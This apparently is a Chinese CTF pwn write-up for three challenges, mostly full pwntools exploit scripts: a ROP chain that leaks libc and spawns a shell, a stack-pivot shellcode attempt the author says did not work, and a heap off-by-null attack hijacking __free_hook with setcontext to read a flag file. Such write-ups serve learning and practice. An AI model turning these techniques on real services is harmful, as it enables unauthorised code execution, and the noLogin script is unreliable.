# babyRop

32位rop 本地随便打 后来发现远程没有回显 拿system蒙出来的

```
#!usr/bin/env python 
# -*- coding: utf-8 -*-
from pwn import  *
from easyLibc import *
from ctypes import cdll

context(arch='amd64',endian='el',os='linux')
context.log_level = 'debug'
context.timeout = 1
debug = 1
if debug == 1:
	p = process("./chall")
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
else:
	p = remote("192.168.39.121",11000)
	# libc = ELF("./libc.so.6",checksec=False)
call_libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")

sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
leak = lambda name,addr :log.success(name+":"+hex(addr))
elf = ELF("./chall",checksec=False)


system_plt = elf.plt['system']
puts_got = 0x0804C010
puts_plt = 0x08049090
pop_ebx = 0x08049022
bss = 0x0804C02E
libc_start_main_got = elf.got['__libc_start_main']
while True:
	try:
		pd = 'a'*44
		pd += p32(system_plt) + p32(0x0804926B) + p32(libc_start_main_got)
		# pd += p32(system_plt) + p32(0xdeadbeef) + p32(buf)
		sl(pd)
		libc_sm = u32(p.recvuntil("\xf7")[-4:])

		libc = easyLibc("__libc_start_main",libc_sm)
		libc_base = libc_sm - libc.dump("__libc_start_main")
		one = [0xcdc4b,0x1487fb,0x1487fc]
		og = libc_base + one[1]
		sys_addr = libc_base + libc.dump("system") 
		gets_addr = libc_base + libc.dump("gets")
		bin_sh = libc_base + libc.dump("str_bin_sh")

		pd = 'a'*44 
		pd += p32(sys_addr) + p32(0xdeadbeef) + p32(bin_sh)
		sla("Input:\n",pd)
		success("libc_base =" + hex(libc_base))
		break
		
	except Exception:
		p.close()
		p = remote("192.168.39.121",11000)

p.interactive()
```





# noLogin

在admin存在栈溢出因为溢出较少 所以需要布置栈迁移 参靠网上wp，布置`read_plt;call rsi` 

扩大读写 但是没有复现成功

exp:

```
#!usr/bin/env python 
# -*- coding: utf-8 -*-
from pwn import  *
from easyLibc import *
from ctypes import cdll

context(arch='amd64',endian='el',os='linux')
context.log_level = 'debug'
context.timeout = 1
debug = 1
if debug == 1:
	p = process("./chall")
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
else:
	p = remote()
	# libc = ELF("./libc.so.6",checksec=False)
call_libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")

sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
leak = lambda name,addr :log.success(name+":"+hex(addr))
elf = ELF("./chall",checksec=False)

ru('input>>')
sl('2')
#debugf(0x40186b)
ru('>password: ')

rdi = 0x0000000000401173
sh = 0x000000000060204b
system = 0x400E58
buf = 0x0602060+0x100
call_rsi=0x000000000040186b
pay = p32(0x602101)+'\x00' +p64(0x602030+0x28)+ p64(elf.plt['read'])+p64(call_rsi)

shellcode=asm('''
              xor rax, rax;
              push r11;
              pop rdx;
              mov rsi, 0x602100;
              syscall;
              add rsi, 28;
              jmp rsi;
              ''')
sl(pay)
print hex(len(shellcode))
sl(shellcode)
gdb.attach(p,'b *0x00000000004009C4\nc')
shellcode1=asm('''
               xor rax, rax;
               mov rax, 2;
               sub rsi, 16;
               mov rdi, rsi;
               xor rsi, rsi;
               syscall;

               mov rdi, rax;
               xor rax, rax;
               mov rsi, 0x602300;
               mov rdx, 0x80;
               syscall;
               
               mov rax, 1;
               mov rdi, 1;
               syscall;
               ''')
sl("a"*8 + './flag\x00\x00'+shellcode1)
p.interactive()
```



# whatYourName

沙箱构造的混乱bin布局可以用来直接泄露

off by null构造向前合并 构造堆块重叠布置rop链即可

```
#!usr/bin/env python 
# -*- coding: utf-8 -*-
from pwn import  *
from easyLibc import *
from ctypes import cdll

context(arch='amd64',endian='el',os='linux')
context.log_level = 'debug'
debug = 1
if debug == 1:
	p = process("./chall")
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
else:
	p = remote("192.168.39.121",9999)
	libc = ELF("./libc.so.6",checksec=False)
call_libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")

sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
leak = lambda name,addr :log.success(name+":"+hex(addr))
elf = ELF("./chall",checksec=False)

def cmd(cho):
	sla("5.exit\n",str(cho))

def add(size):
	cmd(1)
	sla("name size:\n",str(size))

def edit(idx,content):
	cmd(2)
	sla("index:\n",str(idx))
	sleep(0.02)
	sla("name:\n",str(content))

def show(idx):
	cmd(3)
	sla("index:\n",str(idx))

def free(idx):
	cmd(4)
	sla("index:\n",str(idx))

def exit():
	cmd(5)

add(0xe8) # 0
show(0)

libc.address = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - 88 - libc.sym['__malloc_hook'] - 0x10
open_ = libc.sym['open']
read_ = libc.sym['read']
write_ = libc.sym['write']

pop_rdi = libc.search(asm("pop rdi;ret")).next()
pop_rsi = libc.search(asm("pop rsi;ret")).next()
pop_rdx = libc.search(asm("pop rdx;ret")).next()
ret = 0x0000000000000937 + libc.address
success("pop_rdi = " + hex(pop_rdi))
add(0x70) # 1
show(1)
heap_addr = u64(p.recv(6).ljust(8,'\x00'))

add(0xf0) # 2
add(0x38) # 3
add(0xf0) # 4
add(0x30) # 5
free(2)
edit(3,'a'*0x30+p64(0x140)) # 2-3-4
free(4)

add(0xf0) # 2
add(0x60) # 4
add(0x20) # 6

flag_addr = heap_addr + 0x55737989b3e0-0x55737989b570
setcontext = libc.sym["setcontext"] + 53
rop = heap_addr - 0x561c6dee4570+0x0000561c6dee4d90
edit(1,'./flag\x00\x00')
edit(3,'aaaaaaaa'+p64(libc.sym['__free_hook']))
edit(6,p64(setcontext))
add(0x100) #7
pd = p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(open_)
pd += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(rop+0x500)+p64(pop_rdx)+p64(0x40)+p64(read_)
pd += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(rop+0x500)+p64(pop_rdx)+p64(0x40)+p64(write_)
edit(7,'a'*8+pd)

frame = SigreturnFrame()
frame.rsp = rop+8
frame.rip = ret

edit(0,frame)
free(0)

success('libc.address = '+ hex(libc.address))
success("heap_addr = " + hex(heap_addr))

ti()
```

